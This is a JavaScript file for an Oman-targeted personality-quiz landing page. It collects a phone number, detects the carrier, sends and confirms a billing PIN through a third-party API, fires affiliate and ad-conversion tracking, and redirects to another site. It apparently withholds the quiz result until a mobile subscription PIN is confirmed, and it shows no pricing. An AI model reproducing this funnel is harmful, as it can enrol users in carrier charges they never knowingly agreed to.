(function () {

    let botonSiguiente = document.querySelector('.text-loading');
    botonSiguiente.style.display = 'none';

    let textLoading = document.querySelector('.text-loading-pin');
    textLoading.style.display = 'none';

    e = document.querySelectorAll('[lng-a]');

    for (var i = 0; i < this.e.length; i++) {
        this.e[i].classList.toggle('visible');
    }
    params();

})();

const endPoint = 'https://api.playplace.mobi/v1/?mclient=1008&mcountry=OM&mversion=2';
const url_id = 10548;
const offer_id = 4059;
const tracking_id = 54632;

const opid = {
    ooredoo: 253,
    omantel: 397
}

const club_id = {
    ooredoo: 85122,
    omantel: 83272
}

const MESSAGE = {
    ERROR: 'ERROR',
    OK: 'OK'
}
let score = 0;
let service_id;
let operatorName;
let msisdn;
let pincode;
let transaction_id;
let flag;
let flagFunction;
let cookieMsisdn;
let cookieoperator;

he_reader()

function he_reader() {
    cookieMsisdn = (getCookie('msisdn')) ? cookieMsisdn : false; 
    // cookieMsisdn = (getCookie('msisdn')) ? cookieMsisdn : '845967122'; 
    cookieoperator = (getCookie('operator')) ? cookieoperator : false;
    hidenBoxes(cookieMsisdn);
}

function validateCookies(msisdn) {
    return (msisdn) ? true : false;
}

function hidenBoxes(msisdnBox) {
    const isValidateCookies = validateCookies(msisdnBox)
    const numberValidate = msisdnBox;
    msisdn = numberValidate;
    if (isValidateCookies) {

        let mobile = document.getElementById('mobile');
        let textMobile = document.getElementById('text_mobile');

        mobile.style.display = "none";
        textMobile.innerHTML = `Your mobile number is ${msisdnBox}`
    } else {
        return
    }
}

function btn_next(e) {
    // Ocultar todos
    steps = document.querySelectorAll('.step');
    for (var i = 0; i < this.steps.length; i++) {
        this.steps[i].classList.remove('visible');
    }
    // Mostrar el div con id
    div = document.getElementById(e);
    div.classList.add('visible');
    // Progress bar
    progress();
}
function validar(e) {
    tecla = (document.all) ? e.keyCode : e.which;
    if (tecla == 8) return true;
    patron = /\d/;
    te = String.fromCharCode(tecla);
    return patron.test(te)
}
// Progress bar
function progress() {
    steps = 8;
    div = document.querySelectorAll('[bar]')[0];
    w = parseInt(div.getAttribute('bar'));
    if (w){w+=1} else {w=1}
    div.setAttribute('bar',w);
    div.setAttribute('style','width:'+(w*100/steps)+'%');
    //
    img = document.querySelectorAll('[img]')[0];
    img.removeAttribute('class');
    img.setAttribute('class','img img_'+w);

}
progress();
//
score = 0;
function add_score(e) {
    score+=e;
    if (score>7) {
        result_1_en='You\'re an open person';
        result_2_en='Openness is shorthand for "openness to experience." People who are high in openness enjoy adventure. They\'re curious and appreciate art, imagination and new things. The motto of the open individual might be, "variety is the spice of life."';
        result_1_ar='&nbsp';
        result_2_ar='&nbsp';
    } else if (score>3) {
        result_1_en='You\'re a conscientious person';
        result_2_en='People who are conscientious are organized and have a strong sense of duty. They\'re dependable, disciplined and achievement-focused. You won\'t find conscientious types jetting off on round-the-world journeys without an itinerary; they\'re planners.';
        result_1_ar='&nbsp';
        result_2_ar='&nbsp';
    } else {
        result_1_en='You\'re an introverted person';
        result_2_en='Introversion is a personality trait characterized by a focus on internal feelings rather than on external sources of stimulation. Being an introvert does not mean that you are socially anxious or shy.';
        result_1_ar='&nbsp';
        result_2_ar='&nbsp';
    }
    document.querySelectorAll('[result_1_en]')[0].innerHTML=result_1_en;
    document.querySelectorAll('[result_2_en]')[0].innerHTML=result_2_en;
    document.querySelectorAll('[result_1_ar]')[0].innerHTML=result_1_ar;
    document.querySelectorAll('[result_2_ar]')[0].innerHTML=result_2_ar;
}

function validar(e) {

    let msisdnValue = document.getElementById('mobile').value;
    let pinValue = document.getElementById('pin').value;

    tecla = (document.all) ? e.keyCode : e.which;
    patron = /\d/;
    te = String.fromCharCode(tecla);

    if (e.keyCode === 13 && !e.shiftKey) {
        e.preventDefault();
        if (msisdnValue != "" && flag === undefined) {
            btnNext1();
        }
        if (pinValue != "" && flag === true) {
            btnNext2();
        }
    }

    return patron.test(te)
}

function setInputEnd(id) {
    var el = document.getElementById(id);
    el.selectionStart = el.selectionEnd = el.value.length;
    el.focus();
}

function btn_lng() {

    lng_select = document.getElementById('lng_select');
    mobile = document.getElementById('mobile');
    pincode = document.getElementById('pin');

    textloading = document.getElementById('textloading');
    textloadingPin = document.getElementById('text-loading-pin');

    mobile.placeholder = 'التليفون المحمول';
    pincode.placeholder = 'دبوس';

    lng_select.addEventListener('click', () => {
        if (mobile.placeholder == 'Mobile' || pincode.placeholder == 'pin') {
            mobile.placeholder = 'التليفون المحمول';
            pincode.placeholder = 'دبوس';
        } else {
            mobile.placeholder = 'Mobile';
            pincode.placeholder = 'pin';
        }
    })

    lngA = document.querySelectorAll('[lng-a]');
    for (var i = 0; i < this.lngA.length; i++) {
        this.lngA[i].classList.toggle('visible');
    }
    lngB = document.querySelectorAll('[lng-b]');
    for (var i = 0; i < this.lngB.length; i++) {
        this.lngB[i].classList.toggle('visible');

    }

    if (textloading.textContent == "Loading") {
        textloading.innerHTML = "ذرا رکیں"
    } else {
        textloading.innerHTML = "Loading"
    }

    if (textloadingPin.textContent == "Loading") {
        textloadingPin.innerHTML = "ذرا رکیں"
    } else {
        textloadingPin.innerHTML = "Loading"
    }
}

function btnNext1() {

    if (cookieMsisdn) {
        getSendPinOmantel()
    }

    if (flagFunction === false) {
        return;
    }

    msisdn = document.getElementById('mobile').value;

    if (msisdn.length === 8) {
        msisdn = `968${msisdn}`
    }

    let numero = msisdn.substring(3, 6);
    let country = msisdn.substring(0, 3);

    if (msisdn.length === 11) {
        sendNumber(numero, country);
    } else {
        return alert('invalid phone number');
    }
}

function btnNext2() {

    if (flagFunction === false) {
        return;
    }

    pincode = document.getElementById('pin');
    let pintrim = pincode.value.trim();
    let parseEnt = parseInt(pincode.value);

    if (pincode.value == parseEnt) {
        if (pincode.value == null || pincode.value == "" || pintrim == "" || pincode.value.length < 4 || Number.isNaN(parseEnt)) {
            return alert('Invalid Pin');
        } else {
            pincode = pincode.value
            onPinConfirm(operatorName);
        }
    } else {
        return alert('Invalid Pin');
    }


}

function sendNumber(numero, country) {

    if (country === '968') {
        let numberOperators = [
            {
                number: ['71', '72', '901', '902', '903', '904', '905', '906', '907', '908', '909', '91', '92', '93', '98', '99'],
                operator: 'omantel',
                serviceNumber: '134'
            },
            {
                number: ['78', '79', '94', '95', '96', '97'],
                operator: 'ooredoo',
                serviceNumber: '133'
            },
        ];

        let numberFound = numberOperators.find(data => data.number.find(number => {
            let numberOmantel = numero.substring(0, 2);
            if (number === numero) {
                return number;
            } else if (number === numberOmantel) {
                return number;
            }
        }));

        if (numberFound != undefined) {
            if (msisdn.length === 11) {
                operatorName = numberFound.operator; //Set Operator Name
                service_id = numberFound.serviceNumber; // Set Service Number
                return getSendPinOmantel();
            } else {
                return alert('Invalid Phone Number');
            }
        } else {
            return alert('Invalid Phone Number');
        }
    } else {
        alert('Wrong mobile number')
    }
}

function onWaitStepToConfirmPin() {
    let botonesBox = document.querySelectorAll('.text-btn11');
    let botonSiguiente = document.querySelector('.text-loading');

    botonSiguiente.style.display = 'inline-block';

    for (let index = 0; index < botonesBox.length; index++) {
        botonesBox[index].style.display = "none";
    }
}

function onSuccessStepToConfirmPin() {
    let botonesBox = document.querySelectorAll('.text-btn11');

    for (let index = 0; index < botonesBox.length; index++) {
        if (botonesBox[index].classList.contains('visible')) {
            botonesBox[index].style.display = "inline-block";
        }
    }
}

function onWaitStepToResult() {
    let textLoading = document.querySelector('.text-loading-pin');
    let botonesBox = document.querySelectorAll('.text-btn12');

    for (let index = 0; index < botonesBox.length; index++) {
        botonesBox[index].style.display = "none";
    }

    textLoading.style.display = 'inline-block';
}

function onSuccessStepToResult() {
    let botonesBox = document.querySelectorAll('.text-btn12');

    for (let index = 0; index < botonesBox.length; index++) {
        if (botonesBox[index].classList.contains('visible')) {
            botonesBox[index].style.display = "inline-block";
        }
    }

}

function getSendPinOmantel() {

    flagFunction = false

    onWaitStepToConfirmPin()

    var req = new XMLHttpRequest();

    req.open('POST', endPoint, true);

    req.send(JSON.stringify({
        method: 'send_pin',
        "msisdn": msisdn,
        "opid": opid.omantel,
        "clubid": club_id.omantel,
        "campUrl": window.location.href
    }));

    req.onreadystatechange = function () {

        flagFunction = true

        if (req.status == 200 && req.readyState == 4) {

            const data = JSON.parse(req.response);
            const splitData = data.responseText.split('|')
            const validateCarrier = splitData.includes(MESSAGE.OK)

            // if (validateCarrier) {
            if (validateCarrier) {

                operatorName = 'omantel'

                //Send Lead
                gtag('event', 'conversion', { 'send_to': 'AW-590224479/viYzCJ6BmN4BEN-4uJkC' });
                //End Lead

                const mobile_box = document.getElementById('mobile_box')
                const pin_box = document.getElementById('pin_box');
                const botonSiguiente = document.querySelector('.text-loading');

                mobile_box.style.display = 'none';
                pin_box.style.display = 'block';

                botonSiguiente.style.display = 'none';

                onSuccessStepToConfirmPin()
                getTransactionId()
            } else {
                getSendPinOoredeoo()
            }
        };
    }
}

function getSendPinOoredeoo() {

    flagFunction = false

    onWaitStepToConfirmPin()

    var req = new XMLHttpRequest();

    req.open('POST', endPoint, true);

    req.send(JSON.stringify({
        method: 'send_pin',
        "msisdn": msisdn,
        "opid": opid.ooredoo,
        "clubid": club_id.ooredoo,
        "campUrl": window.location.href
    }));

    req.onreadystatechange = function () {

        flagFunction = true

        if (req.status == 200 && req.readyState == 4) {

            const data = JSON.parse(req.response);
            const splitData = data.responseText.split('|')
            const validateCarrier = splitData.includes(MESSAGE.OK)

            if (validateCarrier) {
                operatorName = 'ooredeoo'

                //Send Lead
                gtag('event', 'conversion', { 'send_to': 'AW-590224479/viYzCJ6BmN4BEN-4uJkC' });
                //End Lead

                const mobile_box = document.getElementById('mobile_box')
                const pin_box = document.getElementById('pin_box');
                const botonSiguiente = document.querySelector('.text-loading');

                mobile_box.style.display = 'none';
                pin_box.style.display = 'block';

                botonSiguiente.style.display = 'none';
                onSuccessStepToConfirmPin()
                getTransactionId()
            } else {
                onSuccessStepToConfirmPin()
                alert('INVALID NUMBER: ', splitData)
            }
        };
    }
}

function onPinConfirm() {
    flagFunction = false

    onWaitStepToResult()

    console.log(msisdn)

    var req = new XMLHttpRequest();

    req.open('POST', endPoint, true);
    req.send(JSON.stringify({
        "method": "confirm_pin",
        "msisdn": msisdn,
        "opid": opid.omantel,
        "clubid": club_id.omantel,
        "operatorName": operatorName,
        "password": pincode
    }));

    req.onreadystatechange = function () {

        flagFunction = true

        if (req.status == 200 && req.readyState == 4) {

            const data = JSON.parse(req.response);
            const splitData = data.responseText.split('|')
            const validateCarrier = splitData.includes(MESSAGE.OK)

            if (validateCarrier) {
                let pin_box = document.getElementById('pin_box');
                let resultado = document.getElementById('resultado')

                resultado.style.display = 'block';
                pin_box.style.display = 'none';

                onSuccessStepToResult();
                getPixel();
            } else {
                let textLoading = document.querySelector('.text-loading-pin');
                alert('ERROR WITH PIN', splitData);
                textLoading.style.display = 'none';
                onSuccessStepToResult();
            }
        };
    }
}

function getTransactionId() {

    var req = new XMLHttpRequest();

    req.open('POST', endPoint, true);

    const { aff_id, aff_sub, aff_sub2, aff_sub3, aff_sub4, aff_sub5, placement, creative } = this.setSub_Id;

    req.onreadystatechange = function () {

        if (req.status === 200 && req.readyState === 4) {

            let data = JSON.parse(req.response)

            return transaction_id = data.response.data.transaction_id;
        }
    };

    req.send(JSON.stringify({
        "method": "transaction_id",
        "offer_id": offer_id,
        "aff_id": aff_id,
        "aff_sub": aff_sub,
        "url_id": url_id,
        "aff_sub2": aff_sub2,
        "aff_sub3": aff_sub3,
        "aff_sub4": aff_sub4,
        "aff_sub5": aff_sub5,
        "placement": placement,
        "creative": creative,
    }))
}

function getPixel() {
    var req = new XMLHttpRequest();

    req.open('POST', endPoint, true);

    req.onreadystatechange = function () {

        if (req.status == 200 && req.readyState == 4) {
            getRedirect();
        }
    };

    req.send(JSON.stringify({
        "method": "pixel_id",
        "offer_id": offer_id,
        "transaction_id": transaction_id,
        "msisdn": msisdn,
        "operador": operatorName
    }))
}

function getRedirect() {
    let urlredirectUrl = `http://helm.tekmob.com/pim/cr7eviva?p=34&e=68321863&PIMml=HTML5&PIMdev=25536`;
    setTimeout(() => {
        return window.location.href = urlredirectUrl;
    }, 3000);
}

function params() {
    let queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    let aff_id = urlParams.get('aff_id');
    let aff_sub = urlParams.get('aff_sub');
    let aff_sub2 = urlParams.get('aff_sub2');
    let aff_sub3 = urlParams.get('aff_sub3');
    let aff_sub4 = urlParams.get('aff_sub4');
    let aff_sub5 = urlParams.get('aff_sub5');
    let gclid = urlParams.get('gclid');
    let placement = urlParams.get('placement');
    let creative = urlParams.get('creative');

    if (aff_id === null) {
        aff_id = 1;
    }

    if (!gclid) {
        aff_sub = ""
    } else {
        aff_sub = gclid;
    }

    this.setSub_Id = {
        aff_id,
        sub_source: aff_id,
        source_id: aff_id,
        aff_sub,
        aff_sub2,
        aff_sub3,
        aff_sub4,
        aff_sub5,
        placement,
        creative
    }

}